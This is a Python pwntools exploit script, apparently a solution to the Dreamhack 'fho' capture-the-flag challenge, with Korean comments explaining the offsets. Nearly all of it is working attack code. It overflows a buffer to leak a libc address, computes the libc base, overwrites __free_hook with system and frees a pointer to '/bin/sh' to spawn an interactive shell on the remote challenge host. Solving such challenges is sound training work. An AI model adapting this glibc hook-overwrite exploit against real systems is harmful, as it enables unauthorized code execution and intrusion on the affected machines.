from pwn import *
def slog(n, m):	return success(": ".join([n, hex(m)]))

# For Offline
# p = process("./fho")

# For Online
# """
HOST = int(input("Input host number: "))
PORT = int(input("Input port number: "))
p = remote("host"+str(HOST)+".dreamhack.games", PORT)
# """

elf = ELF("./fho")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

# [1] Library Var & Func Address
buf = b'A' * 0x48	# char 0x30 + long long 0x08 * 2 + SFP 0x08
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b"\x00" * 2)
# SFP 밑에 있는 Return Addr를 불러온다
libc_base = libc_start_main_xx - (libc.symbols["__libc_start_main"] + 231)
# Return Addr는 libc_start_main + 231을 가리키므로,
# 그만큼의 오프셋을 빼서 libc_base를 구한다.
system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

slog("libc_base", libc_base)
slog("system", system)
slog("free_hook", free_hook)
slog("/bin/sh", binsh)

# [2] Write and Free
p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(system))
p.recvuntil("To free: ")
p.sendline(str(binsh))

p.interactive()
